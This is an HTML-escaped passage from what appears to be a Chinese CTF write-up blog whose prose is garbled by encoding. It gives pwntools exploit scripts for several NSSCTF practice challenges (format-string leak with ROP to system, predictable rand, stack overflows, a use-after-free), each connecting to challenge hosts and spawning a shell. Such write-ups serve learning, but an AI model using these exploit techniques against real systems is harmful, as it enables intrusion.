class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;from pwn import *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;from LibcSearcher import *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;import time&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;elf=ELF(&amp;#x27;find_flag&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context(log_level=&amp;#x27;debug&amp;#x27;,os=&amp;#x27;linux&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p=remote(&amp;#x27;node4.anna.nssctf.cn&amp;#x27;,28437)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.sendlineafter(&amp;#x27;name?&amp;#x27;,&amp;#x27;%17$p---%19$p&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.recvuntil(&amp;#x27;you, &amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;a=p.recv(18)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.recvuntil(&amp;#x27;---&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;b=p.recv(14)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;a=int(a,16)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;b=int(b,16)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;log.info(a)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;log.info(b)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;base=b-0x146F&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;system=base+elf.sym[&amp;#x27;system&amp;#x27;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;log.info(&amp;#x27;system addr is %x&amp;#x27;%system)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cat=base+0x2004&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rdi=base+0x14E3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ret=base+0x101A&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload=b&amp;#x27;a&amp;#x27;*0x38+p64(a)+p64(0)+p64(ret)+p64(rdi)+p64(cat)+p64(system)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.sendlineafter(&amp;#x27;else? &amp;#x27;,payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h5 id=&#34;hdctf-2023pwnner&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#hdctf-2023pwnner&#34;&gt;#&lt;/a&gt; [HDCTF 2023]pwnner&lt;/h5&gt;
&lt;p&gt;è¿™ä¸ªé¢˜åˆè®©æˆ‘å­¦åˆ°äº†ä¼ªéšæœºæ•°è¿™ä¸ª srand (0x38) æ§åˆ¶ç€ rand çš„éšæœºå¤§å°åªéœ€è¦ä½¿ç”¨ python åº“çš„ ctypes åªè¦æœ‰ srand å°±èƒ½å¾—åˆ° rand çš„å¤§å°&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;libc = ctypes.CDLL(&amp;quot;libc.so.6&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libc.srand.argtypes = [ctypes.c_uint]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libc.srand(0x39)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rand_result = libc.rand()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;æœ€åä»£ç å¦‚ä¸‹&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;from pwn import *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;import ctypes&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context(arch=&amp;#x27;amd64&amp;#x27;,os=&amp;#x27;linux&amp;#x27;,log_level=&amp;#x27;debug&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libc=ctypes.CDLL(&amp;#x27;/lib/x86_64-linux-gnu/libc.so.6&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p=remote(&amp;#x27;node5.anna.nssctf.cn&amp;#x27;,28917)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libc.srand.argtypes=[ctypes.c_uint]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libc.srand(0x39)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rand_result=libc.rand()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.sendlineafter(&amp;#x27;name:&amp;#x27;,str(rand_result))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload=b&amp;#x27;a&amp;#x27;*(0x40+0x8)+p64(0x4008B2)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.sendline(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h5 id=&#34;litctf-2023å£ç®—é¢˜å¡&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#litctf-2023å£ç®—é¢˜å¡&#34;&gt;#&lt;/a&gt; [LitCTF 2023] å£ç®—é¢˜å¡&lt;/h5&gt;
&lt;p&gt;å£ç®—é¢˜è¦ä¹ˆå£ç®—è¦ä¹ˆå†™ä¸ªè„šæœ¬æˆ‘è¿™ä¹ˆæ‡’è‚¯å®šæ˜¯&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;from pwn import *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p=remote(&amp;#x27;node4.anna.nssctf.cn&amp;#x27;,28904)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context(log_level=&amp;#x27;debug&amp;#x27;,os=&amp;#x27;linux&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;while 1:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    eval_1=0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    payload=0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    p.recvuntil(&amp;#x27;What is &amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    eval_1=p.recvuntil(b&amp;#x27;?&amp;#x27;)[:-1]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    log.info(eval_1)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    payload=eval(eval_1)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    p.send(str(payload))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.recvline()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h5 id=&#34;swpuctf-2022-æ–°ç”Ÿèµ›æœ‰æ‰‹å°±è¡Œçš„æ ˆæº¢å‡º&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#swpuctf-2022-æ–°ç”Ÿèµ›æœ‰æ‰‹å°±è¡Œçš„æ ˆæº¢å‡º&#34;&gt;#&lt;/a&gt; [SWPUCTF 2022 æ–°ç”Ÿèµ›] æœ‰æ‰‹å°±è¡Œçš„æ ˆæº¢å‡º&lt;/h5&gt;
&lt;p&gt;çœ‹åˆ°å±é™©å‡½æ•°æ ˆæº¢å‡ºåè·³è½¬åˆ° execve å³å¯&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;from pwn import *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context(log_level=&amp;#x27;debug&amp;#x27;,os=&amp;#x27;linux&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p=remote(&amp;#x27;node5.anna.nssctf.cn&amp;#x27;,28296)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload=b&amp;#x27;a&amp;#x27;*(0x20+0x8)+p64(0x401257)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.sendline(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h5 id=&#34;nisactf-2022ezheap&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#nisactf-2022ezheap&#34;&gt;#&lt;/a&gt; [NISACTF 2022]ezheap&lt;/h5&gt;
&lt;p&gt;è¿™é¢˜è¿˜æ²¡æ¥å¾—åŠæ‰“å¼€çœ‹å°±å‡ºäº†ï¼Œç›´æ¥è¿è¡Œå‘ç°è¾“å…¥å¾ˆå¤šä¸‹é¢çš„æŠ¥é”™æ˜¯ shï¼Œå¹¶ä¸”æç¤ºå“ªé‡Œå¤šäº†ï¼Œé‚£æˆ‘ä»¬å°±ç›´æ¥å¡æº¢å‡ºé‚£é‡Œè¿è¡Œå°±å¥½&lt;/p&gt;
&lt;h5 id=&#34;wustctf-2020getshell2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#wustctf-2020getshell2&#34;&gt;#&lt;/a&gt; [WUSTCTF 2020]getshell2&lt;/h5&gt;
&lt;p&gt;sh ç›¸å½“äºæ‰§è¡Œ /bin/sh&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;from pwn import *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context(log_level=&amp;#x27;debug&amp;#x27;,os=&amp;#x27;linux&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p=remote(&amp;#x27;node5.anna.nssctf.cn&amp;#x27;,28650)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload=b&amp;#x27;a&amp;#x27;*(0x18+0x4)+p32(0x8048529)+p32(0x08048670)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.sendline(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h5 id=&#34;nisactf-2022uaf&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#nisactf-2022uaf&#34;&gt;#&lt;/a&gt; [NISACTF 2022]UAF&lt;/h5&gt;
&lt;p&gt;æ–°æ‰‹çš„ç¬¬ä¸€ä¸ª uaf é¢˜ç›®è¿™ä¸ªé¢˜ç›®å¾ˆå‹å¥½è®©æˆ‘ä¸å¤ªéš¾å—ï¼Œchecksec çœ‹ä¸€ä¸‹å°±æ˜ç™½å¼€å¯äº† canaryï¼Œä½†æ˜¯æ²¡æœ‰æ³„éœ²æˆ‘åœ¨ stack ä¸Šå‡†å¤‡æ³„éœ²ä»–ä½†æ˜¯ä¸è¡Œï¼Œç›´æ¥æ­»å¾ªç¯ï¼Œ32 ä½æ‹–è¿› ida çœ‹ f5 äº†ï¼Œå‘ç° f5 é‡Œé¢çš„å‡½æ•°æœ‰å¾ˆå¤šï¼Œå¹¶ä¸”é€»è¾‘åˆ†æ˜ï¼Œé‚£åªæœ‰æ…¢æ…¢å®¡è®¡äº†ï¼Œçœ‹ main å‡½æ•°å‘ç°æ˜¯ä¸€ä¸ªèœå•æœ‰ createã€editã€delã€showï¼Œå¹¶ä¸”é‡Œé¢è¿˜æœ‰ä¸€ä¸ª systemï¼Œæ„Ÿè§‰åƒæ˜¯çœ‹åˆ°äº†æ–°å¤§é™†ä¸€æ ·ï¼Œæ ¹æ®é¢˜ç›®æ¥å°±æ˜¯ uafï¼Œç™¾åº¦æœç´¢ä¸€ä¸‹å°±èƒ½å‘ç° free çš„æ¼æ´ï¼Œä½¿ç”¨äº† malloc åˆ†é…äº†å†…å­˜ç©ºé—´ç»™ä¸€ä¸ªæ•°å­—ä½†æ˜¯ free æ²¡æœ‰æ¸…ç©ºåªæ˜¯æš‚æ—¶é‡Šæ”¾äº†ï¼Œåªè¦ä¸‹ä¸€ä¸ªåŒæ ·ç”³è¯·ä¸€æ ·çš„å†…å­˜çš„è¯å†…å­˜åœ°å€å°±ä¼šä¸€æ ·ï¼Œå†çœ‹ edit èƒ½å‘ç°è¿™ä¸ª if è¯­å¥èƒ½å¤Ÿä¿®æ”¹ 0 å¹¶ä¸”åœ¨é‡Œé¢è¾“å…¥å€¼ï¼Œç„¶åå°±æ˜¯ delï¼Œä½¿ç”¨ free é‡Šæ”¾ç©ºé—´ï¼Œåœ¨ä¹‹åå°±æ˜¯ show æ¥æŸ¥çœ‹ edit å†™å…¥çš„å€¼ï¼Œé‚£å°±å¯æœ‰æ¥æ„é€  uaf æ¼æ´äº†ã€‚&lt;br /&gt;
`` å¦‚æœè¯´æœ‰è¦æ³¨æ„çš„ï¼Œå°±æ˜¯åˆ©ç”¨ show åŠŸèƒ½ get_shell çš„æ—¶å€™åªèƒ½ä½¿ç”¨ç´¢å¼•ä¸º 0 çš„å †å—ï¼Œè€Œ edit ä¸èƒ½ç¼–è¾‘ç´¢å¼•ä¸º 0 çš„å †å—ï¼Œæ‰€ä»¥å°±è¦ç”¨åˆ° UAF äº†å› ä¸º if (v1 &amp;lt;= 0 || v1&amp;gt; i ) å…¶ä¸­ 0 å¯ä»¥é€šè¿‡&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;from pwn import *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p=remote(&amp;#x27;node4.anna.nssctf.cn&amp;#x27;,28338)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context(log_level=&amp;#x27;debug&amp;#x27;,os=&amp;#x27;linux&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;def create():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    p.sendlineafter(&amp;#x27;:&amp;#x27;,&amp;#x27;1&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;def edit(index,string):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    p.sendlineafter(&amp;#x27;:&amp;#x27;,&amp;#x27;2&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    p.sendlineafter(&amp;#x27;page&amp;#x27;,index)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    p.sendlineafter(&amp;#x27;strings&amp;#x27;,string)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;def dela(index):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    p.sendlineafter(&amp;#x27;:&amp;#x27;,&amp;#x27;3&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    p.sendlineafter(&amp;#x27;page&amp;#x27;,index)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;def show(index):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    p.sendlineafter(&amp;#x27;:&amp;#x27;,&amp;#x27;4&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    p.sendlineafter(&amp;#x27;page&amp;#x27;,index)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;create()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;dela(&amp;#x27;0&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;create()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload=b&amp;#x27;sh;\x00&amp;#x27;+p32(0x8048642)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;edit(&amp;#x27;1&amp;#x27;,payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;show(&amp;#x27;0&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h5 id=&#34;bjdctf-2020babyrop&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#bjdctf-2020babyrop&#34;&gt;#&lt;/a&gt; [BJDCTF 2020]babyrop&lt;/h5&gt;
&lt;p&gt;æœ¬é¢˜ä½¿ç”¨çš„æ˜¯ libc6_2.23-0ubuntu11_amd64&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;from pwn import *&lt;/span&gt;&lt;br&gt;&lt;span 